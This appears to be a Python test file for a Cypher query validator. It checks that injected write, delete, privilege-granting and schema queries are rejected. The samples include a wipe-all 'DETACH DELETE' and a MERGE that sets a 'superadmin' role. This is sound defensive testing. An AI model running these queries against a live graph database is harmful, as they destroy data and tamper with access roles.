class TestNeo4jectionWriteClauses:
    """Direct write clause injection attempts."""

    async def test_create_node_injection(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query("MATCH (n) RETURN n UNION CREATE (evil:Backdoor {cmd: 'whoami'})")
        assert result.has_errors

    async def test_merge_with_on_create(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query("MERGE (n:Admin {name: 'attacker'}) ON CREATE SET n.role = 'superadmin' RETURN n")
        assert result.has_errors

    async def test_detach_delete_all(self, mocker):
        _mock_cyver(mocker, query_type="w")
        result = await validate_query("MATCH (n) DETACH DELETE n")
        assert result.has_errors

    async def test_foreach_write(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query("MATCH (n) WITH collect(n) as nodes FOREACH (x IN nodes | SET x.pwned = true)")
        assert result.has_errors

    async def test_remove_labels(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query("MATCH (n:Admin) REMOVE n:Admin RETURN n")
        assert result.has_errors

    async def test_insert_node(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query("INSERT (:SeizuWriteProbe {id: 'x'})")
        assert result.has_errors

    async def test_nodetach_delete(self, mocker):
        _mock_cyver(mocker, query_type="w")
        result = await validate_query("MATCH (n) NODETACH DELETE n")
        assert result.has_errors

    async def test_call_subquery_write(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query("CALL { CREATE (:SeizuWriteProbe {id: 'sub'}) } RETURN 1")
        assert result.has_errors

    async def test_call_subquery_in_transactions_write(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query(
            "UNWIND [1] AS x CALL { WITH x CREATE (:SeizuWriteProbe {id: x}) } IN TRANSACTIONS RETURN x"
        )
        assert result.has_errors

    async def test_optional_call_subquery_write(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query(
            "MATCH (n) WITH n LIMIT 1 OPTIONAL CALL { WITH n "
            "CREATE (n)-[:SEIZU_OPTIONAL_PROBE]->(:SeizuWriteProbe) RETURN n AS m } RETURN m"
        )
        assert result.has_errors

    async def test_variable_scope_call_subquery_write(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query(
            "MATCH (n) WITH n LIMIT 1 CALL (n) { CREATE (n)-[:SEIZU_SCOPE_PROBE]->(:SeizuWriteProbe) } RETURN n"
        )
        assert result.has_errors

    async def test_nested_call_subquery_write(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        result = await validate_query(
            "CALL { CALL { CREATE (:SeizuWriteProbe {id: 'nested'}) } RETURN 1 AS x } RETURN x"
        )
        assert result.has_errors

    async def test_union_branch_write(self, mocker):
        _mock_cyver(mocker, query_type="rw")
        query = "MATCH (n) RETURN count(n) AS c UNION CREATE (:SeizuWriteProbe) RETURN 1 AS c"
        result = await validate_query(query)
        assert result.has_errors

    async def test_schema_command(self, mocker):
        _mock_cyver(mocker, query_type="s")
        query = "CREATE INDEX seizu_probe_index IF NOT EXISTS FOR (n:SeizuWriteProbe) ON (n.id)"
        result = await validate_query(query)
        assert result.has_errors

    async def test_write_procedure(self, mocker):
        _mock_cyver(mocker, query_type="w")
        result = await validate_query("CALL db.createLabel('SeizuProbe')")
        assert result.has_errors
